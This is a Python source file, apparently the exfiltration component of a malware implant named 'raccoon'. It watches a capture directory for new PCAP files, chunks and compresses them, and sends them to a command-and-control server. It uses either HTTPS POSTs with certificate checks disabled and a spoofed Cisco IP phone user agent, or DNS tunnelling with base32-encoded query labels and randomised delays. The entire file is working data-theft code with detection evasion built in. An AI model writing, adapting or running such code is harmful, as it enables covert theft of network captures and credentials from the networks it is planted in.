#!/usr/bin/env python3
"""
Data exfiltration via HTTPS or DNS tunneling.
Reads PCAP files and sends them in chunks to the C2 server.
"""

import base64
import gzip
import hashlib
import json
import logging
import random
import time
import threading
from pathlib import Path
from typing import Optional

import requests
import dns.resolver

logger = logging.getLogger("raccoon.exfil")


class Exfiltrator:
    def __init__(self, config: dict):
        c2 = config["c2"]
        self.method = c2.get("exfil_method", "https")
        self.chunk_size = c2.get("exfil_chunk_size_bytes", 512)
        self.capture_dir = Path(config["sniffer"]["capture_dir"])

        fallback = c2.get("fallback", c2)
        https_cfg = fallback.get("https", c2.get("https", {}))
        dns_cfg = fallback.get("dns", c2.get("dns", {}))

        callback_url = https_cfg.get("callback_url", "")
        self.https_url = callback_url.replace("/beacon", "/exfil") if "/beacon" in callback_url else callback_url + "/exfil"
        self.verify_ssl = https_cfg.get("verify_ssl", False)

        self.dns_domain = dns_cfg.get("domain", "")
        self.dns_resolver = dns_cfg.get("resolver", "8.8.8.8")

        self._sent_file_path = self.capture_dir / ".exfil_sent"
        self._sent_files = self._load_sent_files()
        self._running = False
        self._thread: Optional[threading.Thread] = None

    def _load_sent_files(self) -> set[str]:
        """Load the set of already-exfiltrated file paths from disk."""
        if self._sent_file_path.exists():
            try:
                return set(self._sent_file_path.read_text().splitlines())
            except Exception:
                return set()
        return set()

    def _save_sent_files(self):
        """Persist the set of sent files to disk."""
        try:
            self._sent_file_path.write_text("\n".join(sorted(self._sent_files)))
        except Exception as e:
            logger.debug("Could not persist sent-files list: %s", e)

    def _compress(self, data: bytes) -> bytes:
        return gzip.compress(data, compresslevel=9)

    def _send_https(self, filename: str, chunk_idx: int, total: int, data: bytes) -> bool:
        try:
            payload = {
                "file": filename,
                "chunk": chunk_idx,
                "total": total,
                "sha256": hashlib.sha256(data).hexdigest(),
                "data": base64.b64encode(self._compress(data)).decode(),
            }
            resp = requests.post(
                self.https_url,
                json=payload,
                verify=self.verify_ssl,
                timeout=30,
                headers={"User-Agent": "CiscoIPPhone/1.0"},
            )
            return resp.status_code == 200
        except Exception as e:
            logger.debug("HTTPS exfil failed: %s", e)
            return False

    def _send_dns(self, filename: str, chunk_idx: int, total: int, data: bytes) -> bool:
        """Encode data in DNS queries. Each label ≤63 chars, total ≤253 chars."""
        try:
            compressed = self._compress(data)
            encoded = base64.b32encode(compressed).decode().rstrip("=").lower()

            file_hash = hashlib.sha256(filename.encode()).hexdigest()[:8]
            header = f"{file_hash}.{chunk_idx}.{total}"

            max_label = 63
            labels = [encoded[i:i + max_label] for i in range(0, len(encoded), max_label)]
            query = ".".join(labels) + f".x.{header}.{self.dns_domain}"

            if len(query) > 253:
                logger.debug("DNS query too long (%d), splitting", len(query))
                return False

            resolver = dns.resolver.Resolver()
            resolver.nameservers = [self.dns_resolver]
            resolver.timeout = 10
            resolver.lifetime = 10
            resolver.resolve(query, "A")
            return True
        except Exception as e:
            logger.debug("DNS exfil failed: %s", e)
            return False

    def _exfil_file(self, filepath: Path) -> bool:
        """Exfiltrate a single file in chunks."""
        data = filepath.read_bytes()
        total_chunks = (len(data) + self.chunk_size - 1) // self.chunk_size
        filename = filepath.name

        logger.info("Exfiltrating %s (%d bytes, %d chunks)", filename, len(data), total_chunks)

        for i in range(total_chunks):
            chunk = data[i * self.chunk_size : (i + 1) * self.chunk_size]

            if self.method == "https":
                ok = self._send_https(filename, i, total_chunks, chunk)
            else:
                ok = self._send_dns(filename, i, total_chunks, chunk)

            if not ok:
                logger.warning("Exfil chunk %d/%d failed for %s", i, total_chunks, filename)
                return False

            time.sleep(random.uniform(0.5, 2.0) if self.method == "dns" else 0.1)

        logger.info("Exfiltrated %s successfully", filename)
        return True

    def _scan_loop(self):
        """Periodically scan capture directory for new PCAP files to exfiltrate."""
        while self._running:
            try:
                for pcap in sorted(self.capture_dir.rglob("*.pcap")):
                    key = str(pcap)
                    if key in self._sent_files:
                        continue

                    if pcap.stat().st_size == 0:
                        continue

                    if self._exfil_file(pcap):
                        self._sent_files.add(key)
                        self._save_sent_files()

            except Exception as e:
                logger.error("Exfil scan error: %s", e)

            time.sleep(60)

    def start(self):
        self._running = True
        self._thread = threading.Thread(
            target=self._scan_loop, daemon=True, name="exfil-scanner"
        )
        self._thread.start()
        logger.info("Exfiltrator started — method=%s", self.method)

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        logger.info("Exfiltrator stopped")
